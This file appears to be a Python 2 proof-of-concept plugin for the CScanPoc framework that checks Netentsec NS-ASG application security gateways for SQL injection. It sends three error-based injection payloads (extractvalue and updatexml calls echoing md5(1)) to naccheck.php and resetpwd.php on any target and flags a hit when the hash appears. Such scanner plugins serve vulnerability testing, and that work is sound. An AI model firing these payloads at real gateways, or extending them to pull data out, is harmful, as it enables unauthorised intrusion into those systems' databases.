# coding: utf-8

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import re, urlparse

class Vuln(ABVuln):
    vuln_id = 'Netentsec_0004'  # 平台漏洞编号，留空
    name = '网康NS-ASG 应用安全网关SQL注入'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INJECTION # 漏洞类型
    disclosure_date = '2014-04-30'  # 漏洞公布时间
    desc = '''
        网康 NS-ASG 应用安全网关多处SQL注入漏洞：
        /nac/naccheck.php?username=test
        /vpnweb/resetpwd/resetpwd.php?action=update&UserId=
        /vpnweb/resetpwd/resetpwd.php?action=update&password1=111111&UserId=1
    '''  # 漏洞描述
    ref = ''  # 漏洞来源
    cnvd_id = ''  # cnvd漏洞编号
    cve_id = ''  # cve编号
    product = '网康应用安全网关'  # 漏洞应用名称
    product_version = ''  # 漏洞应用版本

class Poc(ABPoc):
    poc_id = 'db2eb8ce-7180-4a10-9e2b-f3fb40bf9cb6'
    author = '47bwy'  # POC编写者
    create_date = '2018-05-25'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            #refer: http://www.wooyun.org/bugs/wooyun-2014-058932
            #refer: http://www.wooyun.org/bugs/wooyun-2014-058971
            #refer: http://www.wooyun.org/bugs/wooyun-2014-058988
            #refer: http://www.wooyun.org/bugs/wooyun-2014-077810
            hh = hackhttp.hackhttp()
            arg = self.target
            #报错注入
            payloads = [
                arg + '/nac/naccheck.php?username=test%2527%20and%201=extractvalue(0x1,concat(0x23,(select%20md5(1))))%23',
                arg + '/vpnweb/resetpwd/resetpwd.php?action=update&UserId=extractvalue(0x1,%20concat(0x23,%20(select%20md5(1))))',
                arg + '/vpnweb/resetpwd/resetpwd.php?action=update&password1=111111&UserId=1%0a%0dand%0a%0d1=(updatexml(1,concat(0x23,md5(1)),1))%23',
            ]
            md5_1 = 'c4ca4238a0b923820dcc509a6f75849'
            for payload in payloads:
                code, head, res, err, _ = hh.http(payload)

                if code == 200 and md5_1 in res:
                    #security_hole('SQL injection: ' + payload)
                    self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                        target=self.target, name=self.vuln.name))

        except Exception, e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        super(Poc, self).exploit()

if __name__ == '__main__':
    Poc().run()
